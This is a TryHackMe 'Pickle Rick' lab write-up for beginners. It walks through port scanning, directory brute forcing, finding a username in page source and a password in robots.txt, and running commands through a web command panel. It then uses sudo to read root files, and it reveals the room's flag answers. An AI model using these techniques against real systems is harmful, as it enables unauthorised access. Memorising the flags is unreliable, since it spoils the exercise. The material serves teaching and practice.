# TryHackMe CTF

> This write-up has been reformatted using AI from my original notes for clarity and better viewing

## Machine Information

| Field            | Details     |
| ---------------- | ----------- |
| **Machine Name** | Pickle Rick |
| **Date**         | 1/26/2026   |
| **Completed**    | 1/27/2026   |
| **Attacker OS**  | Kali Linux  |
| **Difficulty**   | Easy        |

---

## Room Questions

### Task 2: Reconnaissance

| Question                            | Answer                                                         |
| ----------------------------------- | -------------------------------------------------------------- |
| First ingredient Rick needs?        | <details><summary>Reveal</summary>`mr. meeseek hair`</details> |
| Second ingredient in Rick's potion? | <details><summary>Reveal</summary>`1 jerry tear`</details>     |
| Final ingredient?                   | <details><summary>Reveal</summary>`fleeb juice`</details>      |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -p- -sS -sC -sV --min-rate 1000 -Pn 10.64.191.231
```

### Scan Summary

**Scan Date:** 2026-01-26 at 22:37 EST | **Duration:** 22.55 seconds | **Host Status:** Up (latency: 0.038s)

#### Open Ports

| Port   | State | Service | Version                          |
| ------ | ----- | ------- | -------------------------------- |
| 22/tcp | Open  | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80/tcp | Open  | HTTP    | Apache httpd 2.4.41 (Ubuntu)     |

> 65,533 closed TCP ports not shown (all returned reset)

#### Port 22 — SSH

**Service:** OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11)

| Key Type | Bits | Fingerprint                                       |
| -------- | ---- | ------------------------------------------------- |
| RSA      | 3072 | `05:ea:74:5a:16:08:35:c1:fc:d7:01:2a:f5:c0:44:b8` |
| ECDSA    | 256  | `ef:cd:49:ae:0f:a0:8b:42:92:d1:2c:e8:cb:0f:6c:bc` |
| ED25519  | 256  | `86:cd:3e:5c:e2:df:f9:89:a4:a8:93:9f:d8:85:f3:6b` |

#### Port 80 — HTTP

**Service:** Apache httpd 2.4.41 (Ubuntu) | **Server Header:** `Apache/2.4.41 (Ubuntu)`

Supported Methods: `GET` `HEAD` `POST` `OPTIONS`

**Notes:**

- Port 80 is running a Rick and Morty themed site — likely the main attack surface.
- SSH is available but will likely require credentials found elsewhere on the box.

---

## 2. Web Enumeration

### Initial Website Review

Accessing the web server reveals a themed landing page requesting help locating secret ingredients for a potion.

![website](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/picklerick1.png)

### Source Code Analysis

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>
  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->

</body>
</html>
```

**Credential Discovered:**

- **Username:** `R1ckRul3s`

This suggests potential credential reuse for authentication services such as SSH or restricted web endpoints.

### Directory Brute Forcing

```bash
gobuster dir -u http://10.65.180.225 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,bak,old,zip,log,conf,inc -t 40 -b 403,404 --timeout 10s
```

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.180.225
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,js,bak,zip,log,inc,old,conf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login.php            (Status: 200) [Size: 882]
assets               (Status: 301) [Size: 315] [--> http://10.65.180.225/assets/]
index.html           (Status: 200) [Size: 1062]
portal.php           (Status: 302) [Size: 0] [--> /login.php]
robots.txt           (Status: 200) [Size: 17]
denied.php           (Status: 302) [Size: 0] [--> /login.php]
Progress: 685091 / 685091 (100.00%)
===============================================================
Finished
===============================================================
```

### Directory Analysis

- **`/login.php`** — Accessible login endpoint and primary attack surface.
- **`/portal.php`** — Redirects to login, indicating access control.
- **`/denied.php`** — Authorization failure handler.
- **`/index.html`** — Main landing page.
- **`/assets/`** — Static content directory.
- **`/robots.txt`** — Potential source of hidden paths.

### Exploring the Directories

**robots.txt:**

```bash
saintmichael@archangelkali~ > curl http://10.65.180.225/robots.txt
Wubbalubbadubdub
```

**assets/ directory:**

| Type  | Name              | Last Modified    | Size |
| ----- | ----------------- | ---------------- | ---- |
| [TXT] | bootstrap.min.css | 2019-02-10 16:37 | 119K |
| [JS]  | bootstrap.min.js  | 2019-02-10 16:37 | 37K  |
| [IMG] | fail.gif          | 2019-02-10 16:37 | 49K  |
| [JS]  | jquery.min.js     | 2019-02-10 16:37 | 85K  |
| [IMG] | picklerick.gif    | 2019-02-10 16:37 | 222K |
| [IMG] | portal.jpg        | 2019-02-10 16:37 | 50K  |
| [IMG] | rickandmorty.jpeg | 2019-02-10 16:37 | 488K |

Nothing really useful here.

![loginportal](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/picklerick2.png)

Looking back at our previous notes we already have a username and a possible password — might as well give it a try:

- **Username:** `R1ckRul3s`
- **Possible password:** `Wubbalubbadubdub` — pulled from robots.txt

Login was successful!

---

## 3. Investigating login.php

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  ...
</head>
<body>
  <nav class="navbar navbar-inverse">
    <div class="container">
      <div class="navbar-header">
        <a class="navbar-brand" href="#">Rick Portal</a>
      </div>
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Commands</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Creatures</a></li>
        <li><a href="/denied.php">Beth Clone Notes</a></li>
      </ul>
    </div>
  </nav>

  <div class="container">
    <form name="input" action="" method="post">
      <h3>Command Panel</h3></br>
      <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
      <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
    </form>
    <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
  </div>
</body>
</html>
```

We have a Base64 encoded string hidden in a comment:

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

Decoding it layer by layer eventually reveals... `rabbit hole`

Lmao. So that was a waste of time.

---

## 4. Command Console

![codeexecution](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/picklerick3.png)

From the console, we can successfully run `ls`, but we do **not** have permission to use `cat` to read files directly.

```bash
whoami
www-data
```

This confirms we are operating as the low-privileged `www-data` user. Since `cat` is restricted, we look for alternative commands that can display file contents. `less` works:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**Flag 1:** `mr. meeseek hair`

Next, we examine **clue.txt:**

```plaintext
Look around the file system for the other ingredient.
```

Running `find /home -type f -readable 2>/dev/null` reveals:

```
/home/ubuntu/.bash_logout
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.bashrc
/home/ubuntu/.profile
/home/rick/second ingredients
```

`/home/rick/second ingredients` stands out. Listing the directory:

```bash
ls /home/rick -la

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

```bash
file /home/rick/"second ingredients"
/home/rick/second ingredients: ASCII text
```

```bash
less /home/rick/"second ingredients"
```

**Flag 2:** `1 jerry tear`

Now we check what directories we have:

```bash
ls /

bin boot dev etc home initrd.img initrd.img.old lib lib64
lost+found media mnt opt proc root run sbin snap srv sys
tmp usr var vmlinuz vmlinuz.old
```

We inspect sudo permissions for the current user:

```bash
sudo -l

Matching Defaults entries for www-data on ip-10-64-138-139:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-138-139:
    (ALL) NOPASSWD: ALL
```

Critical misconfiguration — `www-data` can run any command as root without a password. We retry listing the root directory:

```bash
sudo ls /root
3rd.txt
snap
```

```bash
sudo less /root/3rd.txt
3rd ingredients: fleeb juice
```

**Final Flag:** `fleeb juice`

---

> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.

---

## Key Takeaways for Beginners

### 1. Always Check the Page Source

The username `R1ckRul3s` was hidden in an HTML comment on the main page. Always view source on every page — developers often leave sensitive information behind accidentally.

### 2. robots.txt Can Leak Sensitive Information

`robots.txt` is meant to tell search engine bots which pages to ignore, but CTF designers (and careless developers) sometimes put sensitive info there. In this case it contained the password `Wubbalubbadubdub`.

### 3. Credential Reuse Is Common

The username from the source code and the string from robots.txt combined to give us a working login. Always try combining discovered strings as credentials — it works more often than you'd think.

### 4. Blocking One Command Doesn't Block the Capability

`cat` was restricted but `less` wasn't. This is a common mistake — blocking a specific binary doesn't prevent someone from achieving the same result with a different tool. `strings`, `more`, `tac`, and `head` can all read files too.

### 5. Always Check `sudo -l`

After getting a shell, checking sudo permissions should be one of your first commands. Finding `(ALL) NOPASSWD: ALL` is essentially game over — you have unrestricted root access without even needing a password.

### 6. Follow the Clues

Each flag pointed to the next step. `clue.txt` told us to look around the filesystem, which led us to `/home/rick`. The box rewards methodical enumeration over guessing.

### Tools Used in This Room

| Tool       | Purpose                                            |
| ---------- | -------------------------------------------------- |
| `nmap`     | Port scanning and service detection                |
| `gobuster` | Web directory and file enumeration                 |
| `curl`     | Fetching web content from the terminal             |
| `find`     | Locating files across the filesystem               |
| `less`     | Reading file contents when `cat` is blocked        |
| `sudo -l`  | Checking sudo permissions for privilege escalation |
| CyberChef  | Decoding Base64 strings                            |

---

> This write-up was created by `saintmichael`
